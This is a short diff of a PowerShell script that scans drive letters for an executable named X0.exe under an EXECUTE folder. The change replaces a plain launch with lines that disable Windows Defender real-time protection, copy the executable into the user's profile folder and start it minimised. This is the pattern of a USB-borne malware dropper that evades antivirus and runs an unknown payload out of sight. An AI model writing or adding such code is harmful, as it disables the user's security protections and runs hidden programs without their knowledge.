@@ -2,8 +2,9 @@ $drives = "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", 
 
 foreach ($drive in $drives) {
     if (Test-Path "${drive}:\EXECUTE\X0.exe") {
-        cmd /k "${drive}:\EXECUTE\X0.exe"
-        Start-Sleep -Seconds 2
+        Set-MpPreference -DisableRealtimeMonitoring $true
+        cmd /c "copy ${drive}:\EXECUTE\X0.exe %userprofile%"
+        cmd /c "start /min %userprofile%\X0.exe"
         exit
     }
 }
